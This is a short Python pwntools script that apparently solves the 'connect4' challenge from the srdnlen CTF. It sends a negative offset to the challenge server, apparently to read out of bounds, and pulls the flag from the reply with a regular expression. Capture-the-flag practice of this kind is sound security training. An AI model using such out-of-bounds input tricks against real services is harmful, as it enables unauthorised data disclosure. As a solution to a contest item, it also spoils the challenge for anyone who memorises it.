#!/bin/env python3

from pwn import *
import logging
import os
import re
logging.disable()

# Se challenge tcp
HOST = os.environ.get("HOST", "connect4.challs.srdnlen.it")
PORT = int(os.environ.get("PORT", 15001))

i = -1
found = False

OFFSET = -13

output = None

with remote(HOST, PORT) as p:
    p.recvrepeat(timeout=0.5)
    p.sendline(str(OFFSET).encode("ascii"))
    output = p.recvrepeat(timeout=1)

output_ascii = output.decode("latin-1", errors="ignore")

output_ascii = output_ascii.replace("|", "").replace(" ", "")

pattern = re.compile("srdnlen\{.*\}")
results = pattern.findall(output_ascii)
if len(results) < 1:
    print("error: couldn't find flag in output (maybe exploit failed?)", file=sys.stderr)
    exit(1)
else:
    print(results[0])
